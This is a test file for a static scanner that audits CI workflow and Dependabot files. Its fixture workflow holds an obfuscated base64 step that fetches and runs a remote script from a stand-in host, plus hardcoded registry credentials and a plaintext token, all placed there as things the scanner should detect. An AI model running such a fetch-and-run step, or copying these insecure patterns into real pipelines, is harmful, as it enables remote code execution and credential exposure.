import { describe, expect, it } from "vitest";
import { runStaticEngine, type StaticEngineConfig } from "../../src/layer2-static/engine";

const BASE_CONFIG: StaticEngineConfig = {
  knownSafeMcpServers: [],
  knownSafeFormatters: [],
  knownSafeLspServers: [],
  knownSafeHooks: [],
  blockedCommands: ["bash", "sh"],
  trustedApiDomains: [],
  unicodeAnalysis: true,
  checkIdeSettings: true,
  persona: "auditor",
  runtimeMode: "offline",
  workflowAuditsEnabled: true,
};

describe("workflow wave C/D/E engine integration", () => {
  it("surfaces newly added Wave C/D/E audit findings through runStaticEngine", async () => {
    const findings = await runStaticEngine({
      projectRoot: "/tmp/project",
      files: [
        {
          filePath: ".github/workflows/release.yml",
          format: "yaml",
          textContent: `on: [pull_request]
jobs:
  release:
    runs-on: ubuntu-latest
    container:
      image: ghcr.io/user:pass@ghcr.io/org/private-image:latest
    steps:
      - if: github.actor == 'dependabot[bot]'
        run: npm publish
      - if: always()
        run: npm publish
      - if: contains(github.event.pull_request.title, 'safe')
        run: npm publish
      - run: echo "Y3VybCAtZnNTTCBodHRwczovL2V2aWwuZXhhbXBsZS9wLnNoIHwgc2g=" | base64 -d | bash
      - run: npm publish
        env:
          NPM_TOKEN: abc123plaintexttoken
`,
          parsed: {
            on: ["pull_request"],
            jobs: {
              release: {
                "runs-on": "ubuntu-latest",
                container: {
                  image: "ghcr.io/user:pass@ghcr.io/org/private-image:latest",
                },
                steps: [
                  {
                    if: "github.actor == 'dependabot[bot]'",
                    run: "npm publish",
                  },
                  {
                    if: "always()",
                    run: "npm publish",
                  },
                  {
                    if: "contains(github.event.pull_request.title, 'safe')",
                    run: "npm publish",
                  },
                  {
                    run: 'echo "Y3VybCAtZnNTTCBodHRwczovL2V2aWwuZXhhbXBsZS9wLnNoIHwgc2g=" | base64 -d | bash',
                  },
                  {
                    run: "npm publish",
                    env: {
                      NPM_TOKEN: "abc123plaintexttoken",
                    },
                  },
                ],
              },
            },
          },
        },
        {
          filePath: ".github/dependabot.yml",
          format: "yaml",
          textContent: `version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule:
      interval: daily
    insecure-external-code-execution: allow
`,
          parsed: {
            version: 2,
            updates: [
              {
                "package-ecosystem": "npm",
                directory: "/",
                schedule: {
                  interval: "daily",
                },
                "insecure-external-code-execution": "allow",
              },
            ],
          },
        },
      ],
      symlinkEscapes: [],
      hooks: [],
      config: BASE_CONFIG,
    });

    const ruleIds = new Set(findings.map((finding) => finding.rule_id));
    expect(ruleIds.has("workflow-anonymous-definition")).toBe(true);
    expect(ruleIds.has("workflow-obfuscation")).toBe(true);
    expect(ruleIds.has("workflow-unsound-condition")).toBe(true);
    expect(ruleIds.has("workflow-unsound-contains")).toBe(true);
    expect(ruleIds.has("hardcoded-container-credentials")).toBe(true);
    expect(ruleIds.has("unredacted-secrets")).toBe(true);
    expect(ruleIds.has("bot-conditions")).toBe(true);
    expect(ruleIds.has("dependabot-cooldown")).toBe(true);
    expect(ruleIds.has("dependabot-execution")).toBe(true);
  });
});
